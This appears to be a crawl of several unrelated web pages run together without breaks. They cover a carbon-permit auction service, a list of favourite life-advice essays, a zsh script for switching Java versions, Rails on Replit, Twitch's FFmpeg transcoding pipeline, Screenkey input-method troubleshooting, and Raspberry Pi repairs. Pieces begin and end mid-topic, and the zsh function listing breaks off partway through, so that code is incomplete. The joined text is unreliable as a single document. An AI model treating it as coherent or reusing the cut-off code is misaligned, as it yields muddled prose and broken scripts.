<p><span>People who have less efficient, and therefore cheaper, equipment have more money for fuel but they need to buy more of it. And those that have more efficient equipment need less and may save money even though their equipment cost them more up front.&nbsp;</span></p>

<p><span>Over time, the amount of fuel available decreases so if the amount of fuel people require doesn’t change, then the fuel gets more expensive. However, the more expensive the fuel, the more it makes sense for people to upgrade to more efficient machines to save money on fuel or run the risk of not being able to operate.&nbsp;</span></p>

<p><span>The beauty of this is that everyone can choose an upgrade system that works for them on a time horizon that makes sense for them regardless of what type of fuel they need. And there is more than one option, here are a few:</span></p>
<ul>
<li><span>they can stop making electricity</span></li>
<li><span>they can operate their power plant more efficiently with the fuel they have</span></li>
<li><span>they can pay for upgrades to their plant to make their fuel go further. This costs money up front but saves them money when they have to buy less fuel.</span></li>
<li><span>they can build a fuel free power plant (aka renewable energy) which also costs money but saves them money on fuel</span></li>
</ul>

<p><span>Lastly, while all this is happening, the money raised from the auction are spent building new fuel free powerplants and helping people use less electricity - so those that need the fuel are also building a future in which no fuel is needed.</span></p>

<p><span>Kotoo allows individual people to drive this change faster by showing up to the auction and buying permits that we don’t plan to use. This makes less fuel available and increases the price. As prices increase, power plants will save more and more money by making one of the 4 choices above. And as prices increase more and more money is available to build fuel free powerplants.</span></p>

<p><span>*For a certain type of fuel, it is mostly true that a gallon of that fuel will always make the same emissions. Combustion nerds (aka the author) know that it is possible to burn fuels in dirty and clean ways but the analogy holds because technology to burn fuel more cleanly usually costs more money because it is newer. It is also true that different types of fuels create dramatically different amounts of emissions (coal is twice as dirty as natural gas) but more fuel always means more emissions and outside of this analogy, the price is set by emissions so it’s robust to how fuel is burned and what type of fuel is being burned</span></p>

<a href="#comments">17 comments</a></p><p>I start each of my <a href="https://www.benkuhn.net/weekly/">weekly reviews</a> by re-reading one of my favorite essays of life advice—a different one each week. It’s useful for a few different reasons:</p>
<ul>
<li>
<p>It helps me get into the right reflective frame of mind.</p>
</li>
<li>
<p>The best essays are dense enough with useful advice that I find new interesting bits every time I read them.</p>
</li>
<li>
<p>Much good advice is <a href="https://tjcx.me/posts/defense-self-help/" target="_blank">easy to understand, but hard to implement</a>. So to get the most benefit from it, you should find whatever version of it most resonates you and then <em>re-read it frequently</em> to keep yourself on track.</p>
</li>
</ul>
<p>I’ve collected my favorite essays for re-reading below. I’ll keep this updated as I find more great essays, and I’d welcome other contributions—please suggest your own favorites in the comments!</p>
<p>There's a lot of essays here! If you'd like, I can email you one essay every weekend, so you can read it before your weekly review:

<p>Paul Graham, <a href="http://paulgraham.com/vb.html" target="_blank">Life is Short</a>. Inspire yourself never to waste time on bullshit again:</p>
<blockquote>
<p>Having kids showed me how to convert a continuous quantity, time, into discrete quantities. You only get 52 weekends with your 2 year old. If Christmas-as-magic lasts from say ages 3 to 10, you only get to watch your child experience it 8 times. And while it’s impossible to say what is a lot or a little of a continuous quantity like time, 8 is not a lot of something. If you had a handful of 8 peanuts, or a shelf of 8 books to choose from, the quantity would definitely seem limited, no matter what your lifespan was.</p>
<p>Ok, so life actually is short. Does it make any difference to know that?</p>
<p>It has for me. It means arguments of the form “Life is too short for x” have great force. It’s not just a figure of speech to say that life is too short for something. It’s not just a synonym for annoying. If you find yourself thinking that life is too short for something, you should try to eliminate it if you can.</p>
<p>When I ask myself what I’ve found life is too short for, the word that pops into my head is “bullshit.” I realize that answer is somewhat tautological. It’s almost the definition of bullshit that it’s the stuff that life is too short for. And yet bullshit does have a distinctive character. There’s something fake about it. It’s the junk food of experience. [1]</p>
<p>If you ask yourself what you spend your time on that’s bullshit, you probably already know the answer. Unnecessary meetings, pointless disputes, bureaucracy, posturing, dealing with other people’s mistakes, traffic jams, addictive but unrewarding pastimes.</p>
</blockquote>
<p>I’ve found that unless I’m vigilant, the amount of bullshit in my life only ever increases. Rereading <em>Life is Short</em> every so often gives me a kick in the pants to figure out what <em>really</em> matters and how to get the bullshit levels back down.</p>
<hr>
<p>Derek Sivers, <a href="https://sivers.org/kimo" target="_blank">There is no speed limit</a>, in which he learns a semester’s worth of music theory in an afternoon:</p>
<blockquote>
<p>Within a minute, he started quizzing me. “If the 5-chord with the flat-7 has that tri-tone, then so does another flat-7 chord. Which one?”</p>
<p>“Uh… the flat-2 chord?”</p>
<p>“Right! So that’s a substitute chord. Any flat-7 chord can be substituted with the other flat-7 that shares the same tri-tone. So reharmonize all the chords you can in this chart. Go.”</p>
<p>The pace was intense, and I loved it. Finally, someone was challenging me — keeping me in over my head — encouraging and expecting me to pull myself up quickly. I was learning so fast, it felt like the adrenaline rush you get while playing a video game. He tossed every fact at me and made me prove that I got it.</p>
<p>In our three-hour lesson that morning, he taught me a full semester of Berklee’s harmony courses.</p>
</blockquote>
<p>This was one of the major inspirations for <a href="https://www.benkuhn.net/impatient/">Be impatient</a>. Every time I reread it, I think of at least one thing where I’m setting myself a speed limit for no reason!</p>
<hr>
<p>Sam Altman, <a href="https://blog.samaltman.com/how-to-be-successful" target="_blank">How To Be Successful</a>. Sam might have observed more successful people more closely than anyone else on the planet, and the advice is as good as you’d expect.</p>
<blockquote>
<p>Focus is a force multiplier on work.</p>
<p>Almost everyone I’ve ever met would be well-served by spending more time thinking about what to focus on. It is much more important to work on the right thing than it is to work many hours. Most people waste most of their time on stuff that doesn’t matter.</p>
<p>Once you have figured out what to do, be unstoppable about getting your small handful of priorities accomplished quickly. I have yet to meet a slow-moving person who is very successful.</p>
</blockquote>

<blockquote>
<p>Almost always, the people who say “I am going to keep going until this works, and no matter what the challenges are I’m going to figure them out”, and mean it, go on to succeed. They are persistent long enough to give themselves a chance for luck to go their way.</p>
<p>… To be willful, you have to be optimistic—hopefully this is a personality trait that can be improved with practice. I have never met a very successful pessimistic person.</p>
</blockquote>
<p>There are lots of different points here, so this one especially bears rereading!</p>
<hr>
<p>R. W. Hamming, <a href="https://www.cs.utexas.edu/users/dahlin/bookshelf/hamming.html" target="_blank">You and your research</a>. Hamming observed almost as many great scientists as Sam Altman did founders. He had some interesting conclusions:</p>
<blockquote>
<p>At first I asked what were the important problems in chemistry, then what important problems they were working on, or problems that might lead to important results. One day I asked, “if what they were working on was not important, and was not likely to lead to important things, they why were they working on them?” After that I had to eat with the engineers!</p>
<p>About four months later, my friend stopped me in the hall and remarked that my question had bothered him. He had spent the summer thinking about the important problems in his area, and while had had not changed his research he thought it was well worth the effort. I thanked him and kept walking. A few weeks later I noticed that he was made head of the department. Many years later he became a member of the National Academy of Engineering. The one person who could hear the question went on to do important things and all the others—so far as I know—did not do anything worth public attention.</p>
<p>… Some people work with their doors open in clear view of those who pass by, while others carefully protect themselves from interruptions. Those with the door open get less work done each day, but those with their door closed tend not know what to work on, nor are they apt to hear the clues to the missing piece to one of their “list” problems. I cannot prove that the open door produces the open mind, or the other way around. I only can observe the correlation. I suspect that each reinforces the other, that an open door will more likely lead you and important problems than will a closed door.</p>
</blockquote>

<blockquote>
<p>There is another trait that took me many years to notice, and that is the ability to tolerate ambiguity. Most people want to believe what they learn is the truth: there are a few people who doubt everything. If you believe too much then you are not likely to find the essentially new view that transforms a field, and if you doubt too much you will not be able to do much at all. It is a fine balance between believing what you learn and at the same time doubting things. Great steps forward usually involve a change of viewpoint to outside the standard ones in the field.</p>
<p>While you are leaning things you need to think about them and examine them from many sides. By connecting them in many ways with what you already know…. you can later retrieve them in unusual situations. It took me a long time to realize that each time I learned something I should put “hooks” on it. This is another face of the extra effort, the studying more deeply, the going the extra mile, that seems to be characteristic of great scientists.</p>
</blockquote>
<p>Hamming is an unusual combination of (a) a great scientist himself, (b) curious and thoughtful about what makes others great, and (c) honest and open about his observations (it seems).</p>
<hr>
<p>Anonymous, <a href="https://autotranslucence.wordpress.com/2018/03/30/becoming-a-magician/" target="_blank">Becoming a Magician</a>—on how to become a person that your current self would perceive as magical:</p>
<blockquote>
<p>The description was about five or six handwritten pages long, and at the time, it was a manifestation of desperate longing to be somewhere other than where I was, someone who felt free and cared for. At the time I saw that description as basically an impossibility; my life could never be so amazing in reality.</p>
<p>Fast forward about seven or ten years and I rediscovered the description when I was moving old notebooks and journals from one dusty storage spot to another. As I read through it, I discovered that 90% of the statements I had made in that description were true (or true in spirit). … It was incredible to me, despite all the changes that had happened in my life since when I wrote the passage, that I had basically become the person whose life I had dreamed of living as a teenager.</p>
<p>That’s pretty fucking cool.</p>
</blockquote>

<blockquote>
<p>And then came Sanatan Dinda. An Indian visual artist from Kolkata, he didn’t even make the finals the first year he competed, and the next year he placed second with a style that broke half a dozen of the implicit rules of ‘good artwork’ at the competition. … [T]he third year he came he won the entire competition by something like ten percent of the total awarded points over the next artist in second place.</p>
<p>… The thing that confused me though was this – I could not work out how he did it. Like, I had zero mental model of how he created that piece in the same timeframe we all had; how he came up with it, designed it, practiced it. Even though he placed first and I placed fifth and logically we both existed on a scale of ‘competence at bodypainting’ it seemed like the skills required were completely different.</p>
</blockquote>
<p>The exercise they suggest is a really useful activity for weekly (or monthly or yearly) reviews. Highly recommended!</p>
<hr>
<p>Dan Luu, <a href="https://danluu.com/p95-skill/" target="_blank">95th percentile isn’t that good</a>. Great for cultivating self-improvement mindset by reminding you how easy (in some sense) it is to make huge improvements at something:</p>

<p>January 30, 2021 – 5 minute read</p>
<section>
<p>With the increased frequency of Java releases handling multiple versions on a single machine is more and more relevant. Solutions already exists, such as the widely used <a href="https://www.jenv.be/">jenv</a> – my goto tool for a long time. For a number of reasons, I recently decided to throw it out of my system and build a solution myself. The result is a few small functions which handles most of my needs.</p>
<span id="continue-reading"></span>
<p><em>(Tldr; if you just want the code, <a href="https://www.bendik.dev/posts/java-version-management-on-macos/#a-solution">just scroll down</a>)</em></p>
<p>My biggest issue was the startup time on new shells. It’s a <a href="https://github.com/jenv/jenv/issues/148">known issue</a>, with several workarounds, but at least to me they all affect my startup time noticably. Now, I might be an impatient guy, I’ll admit that, but I just can’t stand spending time on something that I feel should happen instantly.</p>
<p>My second biggest issue was the troubleshooting. I practically live in my terminal, so problems have a big effect on my productivity. For that reason (and others, I’m sure), I tend to like simple solutions. Fewer blows and whistles, fewer weird problems. Without going into too much detail, I feel that jenv has made a few weird decisions that has ended up with me spending precious time debugging and troublehooting. I am sure these decisions are made for good reasons, so no hard feelings there, but it aligns badly with my love for simplicity.</p>
<h2 id="requirements">Requirements</h2>
<p>So I implemented my own solution. Because as you know, the rational solution to spending too much time on a problem is spending even <em>more</em>. But hey, it resulted in me writing this blog post so I guess there’s that.</p>
<p>My needs are quite simple</p>
<ul>
<li>I want the <code>java</code> command always available</li>
<li>I want the ability to switch, locally, between versions when needed</li>
<li>Bonus: automatically switching version when entering a folder would be cool</li>
</ul>
<p>.. and I believe that’s about it. New versions can easily be downloaded with Homebrew. Changing the version globally would be nice, but is not strictly neccesary.</p>
<p>Now, macOS comes with a little known commandline tool called <code>java_home</code>. It is located at <code>/usr/libexec/java_home</code>, which is not on your <code>PATH</code> by default, so I guess it might be hard to find. Anyway, it knows Java. It knows your default version. It knows the other installed versions. But most importantly for us, you can hand it different filters and get a path to a valid Java home folder back.</p>
<p>Our solution is based around the <code>java_home</code> tool. Let’s see it!</p>
<h2 id="a-solution">A solution</h2>
<p>I keep this in my <code>.zshrc</code> file. I have <em>no</em> idea if this will work in Bash or some other shell – it’s untested in everything but Zsh. Sorry 🤷.</p>
<pre><code><span># Extract version from release file in java folder
</span><span>_java_version</span><span>() {
    </span><span>local </span><span>version_path</span><span>=$</span><span>1
    </span><span>if </span><span>[[ </span><span>-</span><span>f </span><span>$</span><span>version_path</span><span>/release ]]</span><span>; </span><span>then
        </span><span>cat </span><span>$</span><span>version_path</span><span>/release </span><span>| </span><span>grep </span><span>"</span><span>JAVA_VERSION=</span><span>" | </span><span>sed</span><span> -</span><span>E </span><span>'</span><span>s/JAVA_VERSION=|\"//g</span><span>'
    </span><span>else
        </span><span>echo </span><span>$</span><span>path

<p>The usage is mostly there as a comment above each function, but to explain the workflow: list available versions on the system, along with current global and possibly local version with the command <code>jdks</code>. No arguments needed here. To list the active version in your current shell, use the command <code>jdk</code>. Use this last command together with a version number to change version locally: <code>jdk 1.8</code>&nbsp;gives you Java 1.8, <code>jdk 12</code> gives you Java 12. You don’t need to be completely specific, <code>jdk 1.8</code> chooses 1.8.0_265 on my system, even though 1.8.0_151 is installed as well. I’m not fluid on the heuristics here, but it mostly seems to behave.</p>
<h2 id="bonus">Bonus</h2>
<p>One thing I have added later on is loading a Java version from a <code>.java-version</code> file. With the snippet below, if I visit a folder with a <code>.java-version</code>&nbsp;file in it, the version is automatically changed. Could it be any easier? Yeah, I guess – it could check recursively, but I haven’t bothered yet. That sounds like it could also slow down my shell as it would happen on every directory change, so there might be a trade off here. As of now, this fills my needs.</p>

		<p>Philosophically, Replit and Rails are incredibly aligned. We both exist to remove excessive configuration and complexity that stands in the way of building things. However, for a long time, it bothered me that Replit didn't work well with Rails because we focus on small and lightweight projects. Recently, our infrastructure has gotten much more powerful, and I decided to give Rails another spin. It turns out it's not only possible to do Rails on Replit; it's quite a delightful experience. It takes less than 30 seconds from starting a project to seeing the welcome screen:</p>

<p>There is no magic under the hood. You can view the <a href="https://repl.it/@templates/Rails">template here</a>. I merely followed the getting started guide on the rails site and had to do only a couple of modifications to make the development website show up in the iframe on Replit (detailed in the readme file).</p>
<p>Give it a spin, and let me know what you think!</p>

<p>Note: This is the first part of a 2-part series. Please <a href="https://blog.twitch.tv/live-video-transmuxing-transcoding-ffmpeg-vs-twitchtranscoder-part-ii-4973f475f8a3">read part 2</a> after finishing this article.</p>

<p><strong>Background</strong></p>

<p>Twitch is the world’s leading live streaming platform for video games, esports, and other emerging creative content. Every month, more than 2.2 million unique content creators stream or upload video on our website. At its peak, Twitch ingests tens of thousands of concurrent live video streams and delivers them to viewers across the world.</p>

<p>Figure 1 depicts the architecture of our live video Content Delivery Network (CDN) which delivers tens of thousands of concurrent live streams internationally.</p>

<p><img src="https://blog.twitch.tv/assets/uploads/9406390810b8b00cd754d7d2332cfabb.png" alt=""></p>

<p>Twitch, like many other live streaming services, receives live stream uploads in Real-Time Messaging Protocol (<a href="https://en.wikipedia.org/wiki/Real-Time_Messaging_Protocol">RTMP</a>) from its broadcasters. RTMP is a protocol designed to stream video and audio on the Internet, and is mainly used for point to point communication. To then scale our live stream content to countless viewers, Twitch uses HTTP Live Streaming (<a href="https://en.wikipedia.org/wiki/HTTP_Live_Streaming">HLS</a>), an HTTP-based media streaming communications protocol that most video websites also use.</p>

<p>Within the live stream processing pipeline, the transcoder module is in charge of converting an incoming RTMP stream into the HLS format with multiple variants (e.g., 1080p, 720p, etc.). These variants have different bitrates so that viewers with different levels of download bandwidth are able to consume live video streams at the best possible quality for their connection.</p>

<p>Figure 2 depicts the input and output of the transcoder module in our live video CDN.</p>

<p><img src="https://blog.twitch.tv/assets/uploads/721496d4059040ba985be574e9afc577.png" alt=""></p>

<p>In this article, we will discuss</p>

<ul>
  <li>
    <p>how FFmpeg satisfies most of the live transcoding requirements,</p>
  </li>
  <li>
    <p>what features FFmpeg doesn’t provide, and</p>
  </li>
  <li>
    <p>why Twitch builds its own in-house transcoder software stack.</p>
  </li>
</ul>

<p><strong>Using FFmpeg Directly</strong></p>

<p>FFmpeg (<a href="https://www.ffmpeg.org/">https://www.ffmpeg.org/</a>) is a popular open-source software project, designed to record, process and stream video and audio. It is widely deployed by cloud encoding services for file <a href="https://en.wikipedia.org/wiki/Transcoding">transcoding</a> and can also be used for live stream <a href="https://en.wikipedia.org/wiki/Transmux">transmuxing</a> and transcoding.</p>

<p>Suppose we are receiving the most widely used video compression standard of <a href="https://en.wikipedia.org/wiki/H.264/MPEG-4_AVC">H.264</a> in RTMP at 6mbps and 1080p60 (resolution of 1920 by 1080 with a frame rate of 60 frames per second). We want to generate 4 HLS variants of:</p>

<ul>
  <li>
    <p>1080p60 HLS/H.264,</p>
  </li>
  <li>
    <p>720p60 HLS/H.264,</p>
  </li>
  <li>
    <p>720p30 HLS/H.264</p>
  </li>
  <li>
    <p>480p30 HLS/H.264</p>
  </li>
</ul>

<p>One solution is to run 4 independent instances of FFmpeg, each of them processing one variant. Here we set all of their Instantaneous Decoding Refresh (<a href="https://en.wikipedia.org/wiki/Network_Abstraction_Layer">IDR</a>) intervals to 2 seconds and turn off the scene change detection, thus allowing the output HLS segments of all variants are perfectly time aligned, which is required by the HLS standard.</p>

<p><em>FFmpeg 1-in-1-out Sample Commands:</em></p>

<p>_ffmpeg -i  -c:v libx264 -x264opts keyint=<idr interval="">:no-scenecut -s <resolution> -r <fps> -b:v <target bitrate=""> -profile:v <profile> -c:a aac -sws_flags <scaler algorithm=""> -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8_</output></number></scaler></profile></target></fps></resolution></idr></p>

<p><em>Notes:</em></p>

<ul>
  <li>
    <p><em>All parameters surrounded by ‘&lt;&gt;’ require inputs from the user. Some of these are described in greater detail below</em></p>
  </li>
  <li>
    <p><strong>c:v</strong> specifies the video codec to use, in our case, libx264</p>
  </li>
  <li>
    <p><strong>x264opts</strong> specifies libx264 specific options. Here, <strong>IDR interval</strong> should be 2 * your desired FPS, so 720p60 would yield an IDR interval of 120 while 720p30 would require an IDR interval of 60. No-scenecut is used to disable scene change detection</p>
  </li>
  <li>
    <p><strong>s</strong> specifies video size which can be in the form of “width x height” or the name of a size abbreviation</p>
  </li>
  <li>
    <p><strong>r</strong> specifies the FPS</p>
  </li>
  <li>
    <p><strong>b:v</strong> specifies a target video bitrate, which is most useful for streaming when there are bandwidth targets and requirements; there is a companion <strong>b:a</strong> for audio</p>
  </li>
  <li>
    <p><strong>profile</strong> refers to <a href="https://en.wikipedia.org/wiki/H.264/MPEG-4_AVC#Profiles">H.264 profile</a></p>
  </li>
  <li>
    <p><strong>sws_flags</strong> determines what scaling algorithm should be used</p>
  </li>
  <li>
    <p><strong>hls_list_size</strong> is used to determine the maximum number of segments in the playlist (e.g., we can use 6 for live streaming or set it equal to 0 to have a playlist of all the segments). The segment duration (the optional <strong>hls_time</strong> flag) will be same as the IDR interval, in our case is 2 seconds.</p>
  </li>
</ul>

<p>Since H.264 is a lossy compression standard, transcoding will inevitably trigger video quality degradation. Moreover, encoding is a very computationally expensive process, particularly for high resolution and high frame rate video. Due to these two constraints, we would ideally like to transmux rather than transcode the highest variant from the source RTMP to save the computational power and preserve the video quality.</p>

<p>In the above example, if we want to transmux an input 1080p60 RTMP source to HLS, we can actually use the above commands without specifying a size or target FPS and specifying <em>copy</em> for the codecs (to avoid decoding and re-encoding the source):</p>

<p>_ffmpeg -i  -c:v copy -c:a copy -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8_</output></number></p>

<p>Transmuxing the source bitstream is an effective technique, but might cause output HLS to lose its spec compliancy, causing it to be unplayable on certain devices. We will explain the nature of the problem and its ramifications in the next section.</p>

<p>On the other hand, FFmpeg does have the functionality of taking in <em>1</em> input and producing <em>N</em> outputs, which we demonstrate with the following FFmpeg command.</p>

<p><em>FFmpeg 1-in-N-out Sample Commands (use Main Profile, x264 veryfast preset, and the bilinear scaling algorithm):</em></p>

<p>_ffmpeg -i  _</p>

<p>_-c:v libx264 -x264opts keyint=120:no-scenecut -s 1920x1080 -r 60 -b:v <target bitrate=""> -profile:v main -preset veryfast -c:a libfdk_aac -sws_flags bilinear -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8 \_</output></number></target></p>

<p>_-c:v libx264 -x264opts keyint=120:no-scenecut -s 1280x720 -r 60 -b:v <target bitrate=""> -profile:v main -preset veryfast -c:a libfdk_aac -sws_flags bilinear -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8 \_</output></number></target></p>

<p>_-c:v libx264 -x264opts keyint=60:no-scenecut -s 1280x720 -r 30 -b:v <target bitrate=""> -profile:v main -preset veryfast -c:a libfdk_aac -sws_flags bilinear -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8 \_</output></number></target></p>

<p>_-c:v libx264 -x264opts keyint=60:no-scenecut -s 852x480 -r 30 -b:v <target bitrate=""> -profile:v main -preset veryfast -c:a libfdk_aac -sws_flags bilinear -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8_</output></number></target></p>

<p>If we wanted to transmux instead of transcode the highest variant while transcoding the rest of the variants, we can replace the the first output configuration with the previously specified copy codec:</p>

<p>_-c:v copy -c:a copy -hls_list_size <number of="" playlist="" entries=""> <output file="" or="" playlist="">.m3u8_</output></number></p>

<p><em>Notes</em><strong>:</strong></p>

<ul>
  <li>
    <p><em>From the above command, we are transcoding multiple variants out of a single input file. Each “\” denotes a new line, in which we can specify a different combination of flags as well as a unique output name. Each command is independent of the other and can use any other combination of flags.</em></p>
  </li>
  <li>
    <p>The p<strong>r</strong>imary difference<strong>s</strong> for each command here can be seen in the s and r flags which are explained earlier in the article.</p>
  </li>
  <li>
    <p><em>An alternative to running the following transcodes in a single FFmpeg instance is to run multiple instances, one for each desired output in parallel. The 1-in-N-out FFmpeg is a computationally cheaper process, whose reason we will explain next.</em></p>
  </li>
</ul>

<p><strong>A Few Technical Issues</strong></p>

<p>The previous section demonstrated how FFmpeg can be used to generate HLS for live streams. While useful, a few technical issues make FFmpeg a less-than-ideal solution.</p>

<p><em>Transmux and Transcode</em></p>

<p><img src="https://blog.twitch.tv/assets/uploads/21f280d3eaf85ca46e6d0c7ba626bdf7.png" alt=""></p>

<p>In HLS, a variant is comprised of a series of segments, each starting with an IDR frame. The HLS spec requires that IDR frames of a variants’ corresponding segments be aligned, such that they will have the same Presentation Timestamp (<a href="https://en.wikipedia.org/wiki/Presentation_timestamp">PTS</a>). Only in this way can an HLS Adaptive Bitrate (<a href="https://en.wikipedia.org/wiki/Adaptive_bitrate_streaming">ABR</a>) player seamlessly switch among the variants when the viewer’s network condition changes (see Figure 3).</p>

<p><img src="https://blog.twitch.tv/assets/uploads/85a60492f18f8ddc521ac7bf3ae7794f.png" alt=""></p>

<p>If we transcode both the source and the rest of the variants, we will get perfectly time-aligned HLS segments since we force the FFmpeg to encode IDRs precisely every 2 seconds. However, we don’t have control over the IDR intervals in the source RTMP bitstream, which is completely determined by the broadcast software’s configuration. If we transmux the source, the segments of the transmuxed and transcoded variants are not guaranteed to align (see Figure 4). This misalignment can cause playback issues. For example, we have noticed that <a href="https://en.wikipedia.org/wiki/Chromecast">Chromecast</a> constantly exhibits playback pauses when it receives HLS streams with misaligned segments.</p>

<p>For the source RTMP stream with variable IDR intervals, we ideally want the output HLS to look aligned like in Figure 5:</p>

<p><img src="https://blog.twitch.tv/assets/uploads/221d1a11939482fecb69acb0f33104a7.png" alt=""></p>

<p>However, in both the <strong>1<em>-in-1-out</em> and the 1-in-</strong><em>N</em>__-out FFmpeg instances, the N encoders associated with the N output variants are independent. As explained above, the result IDRs will not be aligned (see Figure 4) unless all variants are transcoded (i.e. the highest variant is also transcoded not transmuxed from the source).</p>

<p><em>Software Performance</em></p>

<p>As discussed in Figure 2, our RTMP-HLS transcoder takes in an input of <strong>1</strong> stream and produces an output of <strong>__<em>N</em></strong>__ streams (N = the number of HLS variants. E.g., N = 4 in Figure 5). The simplest way to achieve this output is to create N independent <em>1-in-1-out</em> transcoders, with each generating 1 output stream. The FFmpeg solution described above utilizes this model and has N FFmpeg instances.</p>

<p>There are 3 components within a <em>1-in-1-out</em> transcoder, namely <a href="https://en.wikipedia.org/wiki/Video_decoder">decoder</a>, <a href="https://en.wikipedia.org/wiki/Video_scaler">scaler</a>, and <a href="https://en.wikipedia.org/wiki/Video_decoder">encoder</a> (see Figure 6). Therefore, for <strong>__N</strong>__ FFmpeg instances, we will have N decoders, N scalers, and N encoders altogether.</p>

<p><img src="https://blog.twitch.tv/assets/uploads/fafdd4efb43d05e6faa42f9e3fa091c2.png" alt=""></p>

<p>Since the <strong>N</strong> decoders are identical, the transcoder should ideally eliminate the redundant <em>N-1</em> decoders and feed decoded images from the only decoder to the N downstream scalers and encoders (see Figure 7).</p>

<p><img src="https://blog.twitch.tv/assets/uploads/862300f4e9c083ca89a1f98f9a494e37.png" alt=""></p>

<p>We talked about the decoder redundancy above. Now, let’s take another look at the four-variant …</p></div></div>

<h2><a href="#id16">Initialization&nbsp;failure</a></h2>
<p>Screenkey is very sensitive to improperly configured input methods or
keyboard settings. Installing, removing or “playing around” with some
packages such as <tt><span>im-config</span></tt>, <tt>ibus</tt>, <tt>fcitx</tt> or <tt>scim</tt> might
leave the current settings in a half-broken state. Some distributions
are also known to have broken settings by <em>default</em>.</p>
<p>In short: the various environment flags (<tt>XMODIFIERS</tt>,
<tt>GTK_IM_MODULE</tt>, <tt>QT_IM_MODULE</tt> to name a few) need to be
<em>consistent</em>. They either should be all unset, or all set to the <em>same</em>
input method. When using <tt>ibus</tt>, <tt>fcitx</tt> or other complex methods,
the corresponding daemon <em>must</em> be&nbsp;running.</p>
<p>An “input method” is the mechanism which handles the task of
transforming key presses into characters. Latin languages mostly use a
straightforward key -&gt; character mechanism, but other languages don’t
have a key for each possible character and thus need extra logic.
Programs need to be told <em>which</em> input method to use, and this is
usually done through environment variables. There is one environment
variable for each graphical toolkit and it’s set at the start of the
session, usually by a command in the <tt><span>~/.profile</span></tt> file. Screenkey can
only record a program correctly if it’s using the <em>same</em> input method as
the&nbsp;target.</p>
<p>To check the status of the environment, run the following inside a&nbsp;terminal:</p>
<pre>echo XMODIFIERS=$XMODIFIERS
echo GTK_IM_MODULE=$GTK_IM_MODULE
echo QT_IM_MODULE=$QT_IM_MODULE
</pre>
<p>On a system with a Latin language and without any complex input method
running you should see everything&nbsp;empty:</p>
<pre>XMODIFIERS=
GTK_IM_MODULE=
QT_IM_MODULE=
</pre>
<p>On a system running “ibus” you should&nbsp;see:</p>
<pre>XMODIFIERS=@im=ibus
GTK_IM_MODULE=ibus
QT_IM_MODULE=ibus
</pre>
<p>Additionally, the ibus package must be installed and the ibus daemon
should be running. Check the output&nbsp;of:</p>
<pre>$ pgrep -ax ibus-daemon
982 /usr/bin/ibus-daemon --xim
</pre>
<p><tt><span>ibus-daemon</span></tt> should be present and <em>must</em> include <tt><span>--xim</span></tt> in the
command line. If not, the daemon must be restarted with it! Consult the
documentation of your distribution for more&nbsp;information.</p>
<p>On a system using “fcitx” the following output has to be&nbsp;expected:</p>
<pre>XMODIFIERS=@im=fcitx
GTK_IM_MODULE=fcitx
QT_IM_MODULE=fcitx
</pre>
<p>In this case <tt>fcitx</tt> daemon should be running as&nbsp;well:</p>
<pre>$ pgrep -ax fcitx
1053 /usr/bin/fcitx
</pre>
<p>If you see <em>any</em> mixture of the above, your system is likely to be
incorrectly&nbsp;configured.</p>
<p>If the “ibus” or “fcitx” packages are not installed, there are no
daemons running and the variables are mostly empty, then try simply
unsetting all of them before running Screenkey in a&nbsp;terminal:</p>
<pre>unset XMODIFIERS
unset GTK_IM_MODULES
unset QT_IM_MODULES
screenkey
</pre>
<p>If screenkey runs correctly after these changes, check your startup
files such as <tt><span>~/.profile</span></tt>, <tt><span>~/.bash_profile</span></tt> or
<tt><span>~/.pam_environment</span></tt> and remove the offending variables to make the
change permanent. You must log-out and log-in in order to be able to run
Screenkey normally after the&nbsp;change.</p>
<p>If you’re running either <tt>ibus</tt> or <tt>fcitx</tt> but the variables contain
mixed values, try to reset them manually&nbsp;using:</p>
<pre>export XMODIFIERS=@im=ibus
export GTK_IM_MODULE=ibus
export QT_IM_MODULE=ibus
screenkey
</pre>
<p>Again, if Screenkey works correctly after the change, inspect the
contents of your startup files as above to make the change&nbsp;permanent.</p>
<p>You should always check the documentation of your distribution to see
which input method <em>should</em> be running and how it should be configured.
The above guide is not meant to be exhaustive. If nothing works, get in
touch with the authors or file an issue on Gitlab to get more&nbsp;help.</p>
</div><div id="cannot-stop-screenkey-or-no-status-icon">
<h2><a href="#id17">Cannot stop Screenkey or no status&nbsp;icon</a></h2>
<p>You can exit from Screenkey by right-clicking on it’s status icon and
selecting&nbsp;“Quit”.</p>
<p>If you’re using <span>GNOME</span>/Unity and cannot see any status icon please make
sure the <tt><span>gir1.2-appindicator3-0.1</span></tt> package is installed. Run the
following inside a terminal to install as&nbsp;required:</p>
<pre>sudo apt-get install gir1.2-appindicator3-0.1
</pre>
<p>On any other desktop system Screenkey uses the regular system tray. If
you don’t have a systray or you cannot quit an existing Screenkey, use
the following command in a terminal to kill&nbsp;it:</p>
<pre>pkill -f screenkey
</pre>
<p>The proper way to exit when running Screenkey from a terminal is simply
by interrupting it with <tt>Ctrl+C</tt>.</p>
</div><div id="no-output-in-gnome-terminal">
<h2><a href="#id18">No output in <span>GNOME</span>&nbsp;Terminal</a></h2>
<p>Screenkey cannot currently capture any input directed to native Wayland
programs such as the <span>GNOME</span> Terminal: only X11 programs are&nbsp;supported.</p>
<p>If you need to record a terminal session you’ll have to switch to
another X11 terminal emulator such as xterm, urxvt, mlterm,&nbsp;…</p>

<h2>Introduction</h2>



<div><p>The first batch of the repaired Raspberry Pi’s have been sold! If you missed out on this, don’t worry! There are more to come as I repair them. </p><p>I sold a total of 27 Raspberry Pi’s, 3 people cancelled their orders as they somehow thought these were Raspberry Pi 4’s?! I will relist these  during the week along with a few freshly repaired devices with upgraded SD card slots.</p></div>



<p>After ebay fees and P&amp;P the total was £400 which I have donated to the Raspberry Pi Foundation as can be seen below, more will be coming in a future post to show what this money will go towards. </p>

<h2>Replacing and Upgrading Damaged SD Card Slots</h2>



<p>A large amount of the Pi’s had damaged SD card slots, the original slots are made of plastic which was fairly brittle in 2012 when they were released and they really haven’t aged well! </p>

